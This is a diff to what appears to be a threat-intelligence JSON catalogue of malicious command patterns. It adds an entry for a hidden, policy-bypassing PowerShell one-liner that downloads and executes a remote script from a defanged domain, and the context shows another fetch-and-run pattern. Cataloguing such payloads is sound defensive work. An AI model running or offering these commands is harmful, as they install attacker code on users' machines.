@@ -1144,6 +1144,19 @@
     ]
   },
   {
+    "Pattern": "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('<URL>'))\"",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-20T03:05:54.133000+00:00",
+    "LastSeen": "2026-11-20T03:05:54.133000+00:00",
+    "ReportIds": [
+      "cmwoed01h1z340oml4kvksqv8"
+    ],
+    "PayloadExamples": [
+      "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://simpludelicios[.]md/vcapcha.ps1'))\""
+    ]
+  },
+  {
     "Pattern": "sal a iex;irm <URL>|a",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
